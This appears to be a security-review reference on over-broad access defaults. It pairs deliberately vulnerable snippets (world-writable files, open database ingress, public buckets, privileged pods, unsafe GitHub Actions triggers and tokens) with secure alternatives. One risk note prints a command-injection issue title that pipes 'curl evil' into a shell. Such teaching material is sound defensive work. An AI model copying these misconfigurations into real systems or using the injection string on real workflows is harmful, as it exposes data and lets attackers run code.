# Over-broad access

**Report when:** a default grants more reach than the component needs: any origin, any
network, any user, world-writable files, privileged containers, public storage, or a CI token
and trigger combination that lets outside contributors act with repository rights.

**Skip when:** the openness is the product (a public website bucket, a status page, a CDN
origin), something in front of it narrows access (a load balancer allow-list, a private subnet
with no route in), or the file mode applies to a directory that holds nothing sensitive.

Access defaults rarely look dangerous on their own line. Judge them by what sits behind them:
`0.0.0.0/0` on port 443 of a public web tier is the design, on 5432 of a database it is a
finding. For GitHub Actions, the reachable trigger matters more than the YAML: anything a fork
pull request can start runs with whatever the workflow token and secrets allow.

## Contents

- Vulnerable examples (14): Python, HCL, Bash, YAML (Kubernetes, Ansible), GitHub Actions
- Secure examples (5): deliberate public assets, narrowed CI tokens

## Vulnerable examples

**CORS for every origin with credentials (Python)**

```python
# File: api/main.py
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)
```

Risk: combined with cookie auth, any site can read authenticated responses where the
framework echoes the origin.

**World-writable upload directory (Python)**

```python
# File: uploads/storage.py
os.chmod(UPLOAD_ROOT, 0o777)
```

Risk: every account on the box can swap an upload for something the app will hand out or run.

**Database ingress from anywhere (HCL)**

```hcl
# File: modules/db/security.tf
ingress {
  from_port   = 5432
  to_port     = 5432
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}
```

Risk: the database port is open to the internet; only the password is left.

**Public bucket ACL (HCL)**

```hcl
# File: modules/exports/s3.tf
resource "aws_s3_bucket_acl" "exports" {
  bucket = aws_s3_bucket.exports.id
  acl    = "public-read"
}
```

Risk: customer exports become downloadable by URL.

**Managed database with a public endpoint (HCL)**

```hcl
# File: modules/db/main.tf
resource "aws_db_instance" "main" {
  identifier          = "orders"
  publicly_accessible = true
}
```

Risk: the instance gets an internet-resolvable address; with a wide security group
the login prompt is open to everyone.

**Storage readable by everyone (HCL)**

```hcl
# File: modules/backups/gcs.tf
member = "allUsers"
```

Risk: backups listed and fetched without authentication.

**Chmod 777 in a deploy script (Bash)**

```bash
# File: deploy/post-install.sh
chmod -R 777 /opt/ledger
```

Risk: any account on the host can edit the binaries the service runs as root.

**Permissive umask (Bash)**

```bash
# File: deploy/run.sh
umask 000
```

Risk: every file the process creates, keys included, is world-writable.

**Privileged pod (YAML)**

```yaml
# File: deploy/agent-daemonset.yaml
securityContext:
  privileged: true
  runAsUser: 0
```

Risk: container escape is one mount away.

**World-writable config (Ansible)**

```yaml
# File: roles/ledger/tasks/config.yml
- name: Place ledger config
  ansible.builtin.template:
    src: ledger.ini.j2
    dest: /etc/ledger/ledger.ini
    mode: "0666"
```

Risk: local users can rewrite the DSN the service connects with.

**`pull_request_target` running PR code (GitHub Actions workflow)**

```yaml
# File: .github/workflows/preview.yml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make preview
```

Risk: fork code runs with the base repository's token and secrets. With no
`permissions:` block, the token gets the repository default, often write.

**Event text in a shell and an unpinned action (GitHub Actions workflow)**

```yaml
# File: .github/workflows/triage.yml
- name: Label
  run: ./label.sh "${{ github.event.issue.title }}"
- uses: some-org/auto-label@main
```

Risk: a title such as `"; curl evil | sh; "` runs in the job; the action can change
under you because `@main` moves.

**Blanket token rights (GitHub Actions workflow)**

```yaml
# File: .github/workflows/docs.yml
permissions: write-all
jobs:
  publish:
    uses: ./.github/workflows/reusable-publish.yml
    secrets: inherit
```

Risk: every job and the reusable workflow receive all scopes and all secrets.

**Self-hosted runner for fork pull requests (GitHub Actions workflow)**

```yaml
# File: .github/workflows/e2e.yml
on: pull_request
jobs:
  e2e:
    runs-on: [self-hosted, linux]
```

Risk: in a public repository, fork code runs on a persistent machine inside your
network and can leave something behind for the next job.

## Secure examples

**Public website bucket (HCL)**

```hcl
# File: modules/site/s3.tf
resource "aws_s3_bucket_policy" "site" {
  bucket = aws_s3_bucket.site.id
  policy = data.aws_iam_policy_document.public_read_site.json
}
```

Holds because: a static marketing site is meant to be public; refuted at step 3 when the bucket
holds only built assets.

**HTTPS from anywhere on a load balancer (HCL)**

```hcl
# File: modules/edge/lb.tf
ingress {
  from_port   = 443
  to_port     = 443
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}
```

Holds because: a public web tier; report only if the same rule opens admin or database ports.

**Private key mode (Bash)**

```bash
# File: deploy/post-install.sh
install -m 0600 -o ledger -g ledger master.key /etc/ledger/master.key
```

Holds because: owner-only.

**Least privilege and SHA pins (GitHub Actions workflow)**

```yaml
# File: .github/workflows/ci.yml
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

Holds because: `pull_request` from forks gets a read-only token and no secrets; the action is
immutable.

**Event text through the environment (GitHub Actions workflow)**

```yaml
# File: .github/workflows/triage.yml
- name: Label
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: ./label.sh "$ISSUE_TITLE"
```

Holds because: the shell sees a variable, not spliced script text.
